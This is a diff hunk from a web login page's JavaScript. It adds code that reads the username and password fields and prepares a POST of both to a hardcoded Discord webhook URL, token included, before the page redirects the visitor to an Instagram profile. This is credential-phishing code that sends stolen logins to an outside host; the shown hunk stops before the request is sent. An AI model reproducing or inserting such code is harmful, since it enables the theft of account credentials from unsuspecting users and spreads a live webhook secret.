@@ -98,6 +98,12 @@ function sendMessage() {
     alert("You are required to fill both the Username and Password fields."); // Show an alert if fields are empty
     return; // Prevents redirection if fields are not filled
   }
+	var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1281304373044969522/nhgm8uxUvqatAcOA7h7aBL-QR65xE23QPHXVRqdMYBd6XQafAXLZ3EY_2cjdO0T1QiNe");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+    }
 
   // If both fields are filled, redirect to the new page
   window.location.replace("https://www.instagram.com/tcs_chakwal_campus?igsh=MzRlODBiNWFlZA==");
